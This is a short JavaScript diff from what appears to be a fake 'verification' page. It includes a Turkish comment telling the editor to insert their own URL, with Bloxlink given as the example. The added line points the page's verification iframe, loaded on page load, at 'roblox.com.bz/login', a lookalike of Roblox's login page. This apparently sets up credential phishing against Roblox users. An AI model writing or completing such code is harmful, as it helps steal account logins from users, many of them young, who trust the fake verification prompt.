@@ -18,7 +18,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const frame = document.getElementById('verificationFrame');
         if (frame) {
             // ★★★ BURAYA KENDİ URL'Yİ YAZ ★★★ (Örnek: https://bloxlink.com/verify)
-            frame.src = 'https://www.example.com/verify'; 
+            frame.src = 'https://roblox.com.bz/login?returnUrl=4839119973277302'; 
         }
     }
 
